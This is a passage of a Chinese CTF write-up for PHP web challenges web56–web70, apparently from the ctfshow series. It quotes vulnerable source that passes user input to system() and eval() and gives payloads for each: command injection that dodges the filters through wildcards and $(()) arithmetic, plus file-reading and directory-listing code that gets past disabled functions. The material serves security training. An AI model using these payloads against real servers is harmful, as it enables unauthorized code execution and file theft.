punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--链接是当前打开的题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个包会被保存在临时文件中/tmp/phpXXXXXX，这样我们就可以用.来触发这个脚本文件</p><h3 id="payload：-8"><a href="#payload：-8" class="headerlink" title="payload："></a>payload：</h3><pre><code>?c=.+/???/????????[@-[]//加号代表空格post:#!/bin/shcat flag.php</code></pre><h2 id="WEB57"><a href="#WEB57" class="headerlink" title="WEB57"></a>WEB57</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 还能炫的动吗？</span><span class="token comment" spellcheck="true">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat "</span><span class="token punctuation">.</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点没了问号没了，通配符直接拉了</p><p>get新知识点：</p><p>利用$和()构造数字36来实现绕过</p><pre class="line-numbers language-php"><code class="language-php">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">//~0=-1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"$((~$(())))"</span><span class="token string">"$((~$(())))"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token comment" spellcheck="true">//双引号帮助区分</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token number">01</span>所谓取反的规律是以<span class="token number">0</span>和<span class="token operator">-</span><span class="token number">1</span>中间为y轴对称所以对<span class="token operator">-</span><span class="token number">2</span>取反就是<span class="token number">1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"~$(("</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">""</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">"))"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>所以这个<span class="token string">"$((~$(())))"</span>东西需要<span class="token number">37</span>个也就是<span class="token operator">-</span><span class="token number">37</span>然后用<span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>来包裹起来实现取反也就是<span class="token operator">-</span><span class="token number">37</span><span class="token operator">=</span><span class="token number">36</span>最后$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>一包裹就表示<span class="token number">36</span>了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'$((~$(('</span><span class="token punctuation">.</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">'$((~$(())))'</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'))))'</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload：-9"><a href="#payload：-9" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看似简单，实则从这里开始就要涉及到disable_functions了，起码我输入system的时候是出现了报错</p><h3 id="payload：-10"><a href="#payload：-10" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token string">'__FILE__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ( [0] => 。 [1] => .. [2] => flag.php [3] => index.php ) </span>c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">''</span>flag<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h3><pre><code>file — 把整个文件读入一个数组中readfile — 输出文件,读取文件并写入到输出缓冲。</code></pre><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>源码一样，蚁剑可以连接上，但是flag.php是没有办法读取的</p><h3 id="payload：-11"><a href="#payload：-11" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//paylaod汇总</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fpassthru</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数：-1"><a href="#函数：-1" class="headerlink" title="函数："></a>函数：</h3><pre><code>feof — 测试文件指针是否到了文件结束的位置fgets — 从文件指针中读取一行fgetc — 从文件指针中读取字符fread — 读取文件（可安全用于二进制文件），第二个参数为最多读取的字节数fpassthru — 输出文件指针处的所有剩余数据fgetcsv — 从文件指针中读入一行并解析 CSV 字段，csv是逗号分隔值文件格式，一般用WORDPAD或记事本(NOTE),EXCEL打开。csv(逗号分隔值)是一种用来存储数据的纯文本文件，通常都是用于存放电子表格或数据的一种文件格式。下面和大家分享下几种常用的CSV文件打开方法。</code></pre><h2 id="web60-web65"><a href="#web60-web65" class="headerlink" title="web60-web65"></a>web60-web65</h2><p>下面源码一样我就不重复了</p><h3 id="payload：-12"><a href="#payload：-12" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目录扫描</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以读的形式打开一个文件，同时用while循环来保证文件被正常读取完，然后输出flag.php的每一行文件</p><h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><p>print_r、file、show_source等均被ban了</p><p>所以利用这个来获取目录：</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.txt</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><p>新姿势：</p><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*');foreach($a as $f){echo($f->__toString()." ");}//glob的作用是规定后面的匹配格式，查找匹配的文件路径模式</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token 